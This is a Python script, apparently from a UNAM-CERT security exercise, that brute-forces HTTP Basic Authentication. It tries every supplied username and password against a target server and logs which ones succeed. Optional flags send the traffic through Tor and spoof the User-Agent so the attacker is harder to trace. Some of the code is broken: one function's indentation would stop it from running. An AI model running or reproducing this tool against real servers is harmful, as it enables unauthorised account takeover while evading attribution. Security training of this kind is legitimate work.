#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT

# Referencias:
# https://medium.com/@jasonrigden/using-tor-with-the-python-request-library-79015b2606cb

#Para ejecutar
# Si se quiere varios usuarios o varias contraseñas deben de ir entre comillas y separados por espacios
#python req.py -s servidor -U 'usuario1 usuario2' -P 'contraseña1 contraseña2' -r archivo_reporte -v (-v para modo verboso) 
# Un usuario y una contraseña:
#python req.py -s servidor -U usuario -P contraseña -r archivo_reporte -v (-v para modo verboso) 
# Si se quiere mandar por tor:
#python req.py -s servidor -U usuario -P contraseña -r archivo_reporte -v -t
# Si se quiere cambiar el agente de usuario
#python req.py -s servidor -U usuario -P contraseña -r archivo_reporte -v -t -a nuevo_agente


import sys
import optparse
import requests as req
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
    '''
        Función para imprimir en la salida error estándar y terminar la ejecución
        Recibe:
        mensaje de error, true si se quiere terminar la ejecución del programa 
    '''
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)


def addOptions():
    '''
        Función para las opciones que recibirá el programa al momento de ejecutarse
        Retorna:
        Las opciones que se pusieron
    '''
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-v', '--verbose',action='store_true', dest='verbose', default=False, help='Mode verbose')
    parser.add_option('-r', '--report', dest='report', default="reporte6.txt", help='Bandera para indicar el archivo donde se imprimirán los resultados')
    parser.add_option('-t', '--tor',action='store_true', dest='tor', default=False, help='Bandera para indicar todas las peticiones se harán por TOR')
    parser.add_option('-a', '--agent', dest='agent', default=None, help='Bandera para cambiar el agente de usuario ')
    opts,args = parser.parse_args()
    return opts
   

def checkOptions(options):
    '''
        Función para checar si las opciones requeridas se pusieron para poder ejecutar el programa
    '''
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults(archivo,resultados):
    '''
        Función para escribir en un archivo los resultados obtenidos
        Recibe:
            el nombre del archivo donde se escribirá
            lista de resultados para escribirlos en el archivo
    '''
    with open(archivo,"w") as file:
        file.write("Resultados de usuarios y contraseñas utilizados\n\n")
        for res in resultados:
            file.write("usuario: %8s  contraseña: %10s -> %s \n" % (res[0],res[1],res[2]))
            


def buildURL(server,port, protocol = 'http'):
    '''
        Función para crear la url a partir del puerto, servidor y protocolo
        Recibe:
            servidor, puerto y por omisión el protocolo
        Retorna:
            url ya creada
    '''
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    '''
        Función para hacer la petición a un servidor
        Recibe:
            host, que es la url
            user que es el usuario para autenticarnos
            password que es la contraseña para autenticarnos
        Retorna:
            True si la coneccion fue correcta
            False si por algún motivo no pudo hacer la conexión
    '''
    try:
        response = req.get(host, auth=(user,password))
        # print response
        #print dir(response)
        if response.status_code == 200:
            # print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            return True
        else:
            # print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


def Tor(host,user,password,agente=False):
    '''
        Función para mandar el tráfico por Tor
        Recibe:
            host, que es la url
            user para autenticarnos
            password para autenticarnos
            agente por si quieremos cambiar el agente de usuario, en caso de no requerirlo por defecto tendrá un False
    '''
    sesion = req.session()
    sesion.proxies = {'http':'socks5://127.0.0.1:9050','https':'socks5://127.0.0.1:9050'}
    try:
        if agente:
            headers={'User-agent':agente}
            response = sesion.get(host, auth=(user,password),headers=headers)
        else:
            response = sesion.get(host, auth=(user,password))
        #print response
        if response.status_code == 200:
            # print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            return True
        else:
            # print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
    

if __name__ == '__main__':
    try:
        resultados=[]
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        # print opts.user,opts.password
        for us in opts.user.split():
            for pas in opts.password.split():
                if opts.verbose:
                    print("Intentando usuario: "+us+" contraseña: "+pas)
                    if opts.tor:
                        if opts.agent:
                            if Tor(url, us, pas,opts.agent):
                                resultados.append((us, pas,"Funciono"))
                            else:
                                resultados.append((us, pas,"No funciono"))
                        else:
                            if Tor(url, us, pas):
                                resultados.append((us, pas,"Funciono"))
                            else:
                                resultados.append((us, pas,"No funciono"))
                    else:
                        if makeRequest(url, us, pas):    
                            resultados.append((us, pas,"Funciono"))
                        else:
                            resultados.append((us, pas,"No funciono"))            
                else:
                    if opts.tor:
                        if opts.agent:
                            if Tor(url, us, pas,opts.agent):
                                resultados.append((us, pas,"Funciono"))
                            else:
                                resultados.append((us, pas,"No funciono"))
                        else:
                            if Tor(url, us, pas):
                                resultados.append((us, pas,"Funciono"))
                            else:
                                resultados.append((us, pas,"No funciono"))
                    else:
                        if makeRequest(url, us, pas):
                            resultados.append((us, pas,"Funciono"))
                        else:
                            resultados.append((us, pas,"No funciono"))
        reportResults(opts.report, resultados)

    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
